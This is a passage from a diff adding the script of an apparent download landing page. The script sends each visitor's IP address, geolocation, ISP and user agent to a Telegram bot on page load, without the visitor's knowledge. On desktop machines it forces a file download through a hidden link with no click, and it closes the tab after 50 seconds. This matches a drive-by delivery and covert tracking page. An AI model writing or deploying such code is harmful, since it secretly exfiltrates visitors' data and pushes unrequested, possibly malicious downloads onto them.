+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(5000) });
+        if (geoRes.ok) {
+          const geo = await geoRes.json();
+          city = geo.city || city;
+          region = geo.region || region;
+          country = geo.country_name || country;
+          org = geo.org || org;
+        }
+      } catch (_) {}
+
+      const now = new Date();
+      const dateStr = now.toLocaleDateString('en-GB');
+      const timeStr = now.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+      const visitorId = Math.floor(Math.random() * 100) + 1;
+      const os = detectOS();
+      const mobile = isMobileDevice();
+      const ua = navigator.userAgent || 'unknown';
+      const deviceType = mobile ? '📱 Mobile' : '🖥️ Desktop';
+
+      const message =
+        `📡 *New Download Started (Visitor No: ${visitorId})*\n` +
+        `🕒 Time: ${dateStr}, ${timeStr}\n` +
+        `🌐 IP: ${ip}\n` +
+        `📍 Location: ${city}, ${region}, ${country}\n` +
+        `🖥️ Device: ${os.toUpperCase()} (${org}) (${deviceType})\n` +
+        `📱 User Agent: ${ua}`;
+
+      const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const payload = {
+        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      };
+
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      if (!resp.ok) console.warn('Telegram send failed', resp.status);
+    } catch (e) {
+      console.error('Telegram report error:', e);
+    }
+  }
+
+  // ================================================================
+  //  7. handleDownload()
+  // ================================================================
+  function handleDownload() {
+    const mobile = isMobileDevice();
+    const os = detectOS();
+    const downloadLink = getDownloadLink(os);
+
+    // Update manual link
+    const manualLink = document.getElementById('manualDownloadLink');
+    if (manualLink) {
+      manualLink.href = downloadLink;
+      manualLink.textContent = 'Download ' + CONFIG.DOWNLOAD_FILE_NAME;
+      manualLink.style.opacity = '1';
+      manualLink.style.pointerEvents = 'auto';
+    }
+
+    if (mobile) {
+      showMobileWarning();
+      // Report even on mobile (but no download)
+      reportVisitToTelegram();
+      return;
+    }
+
+    // Desktop: trigger auto download
+    try {
+      const autoBtn = document.createElement('a');
+      autoBtn.href = downloadLink;
+      autoBtn.download = CONFIG.DOWNLOAD_FILE_NAME;
+      autoBtn.style.display = 'none';
+      document.body.appendChild(autoBtn);
+      autoBtn.click();
+      setTimeout(() => { if (autoBtn.parentNode) autoBtn.remove(); }, 1000);
+      // Show rich success status after 1.5s
+      setTimeout(showDesktopDownloadStatus, 1500);
+    } catch (e) {
+      console.error('Download error:', e);
+      // Fallback: still show rich status
+      setTimeout(showDesktopDownloadStatus, 500);
+    }
+
+    // Report visit asynchronously (don't block download)
+    reportVisitToTelegram();
+  }
+
+    // ================================================================
+  //  INIT
+  // ================================================================
+  // Run report on page load
+  setTimeout(reportVisitToTelegram, 100);
+
+  // Run download handler when DOM is ready
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() {
+      setTimeout(handleDownload, 400);
+    });
+  } else {
+    setTimeout(handleDownload, 400);
+  }
+
+  // ================================================================
+  //  8. forcePageClose() - Closes tab/window after 50 seconds
+  // ================================================================
+  function forcePageClose() {
+      setTimeout(function() {
+          try {
+              // Attempt to close the window/tab
+              window.close();
+              
+              // Fallback: if window.close() fails, redirect to about:blank
+              setTimeout(function() {
+                  window.location.href = 'about:blank';
+              }, 500);
+          } catch (e) {
+              // If window.close() is blocked, redirect to about:blank
+              window.location.href = 'about:blank';
+          }
+      }, 50000); // 50 seconds
+  }
+
+  // Call forcePageClose after page loads
+  forcePageClose();
+
+  // Manual link click handler
+  document.addEventListener('DOMContentLoaded', function() {
+    const manual = document.getElementById('manualDownloadLink');
+    if (manual) {
+      manual.addEventListener('click', function(e) {
+        if (isMobileDevice()) {
+          e.preventDefault();
+          showMobileWarning();
+        }
+      });
+    }
+  });
+
+  // Manual link click handler
+  document.addEventListener('DOMContentLoaded', function() {
+    const manual = document.getElementById('manualDownloadLink');
+    if (manual) {
+      manual.addEventListener('click', function(e) {
+        if (isMobileDevice()) {
+          e.preventDefault();
+          showMobileWarning();
+        }
+      });
+    }
+  });
+</script>
+</body>
+</html>
+```
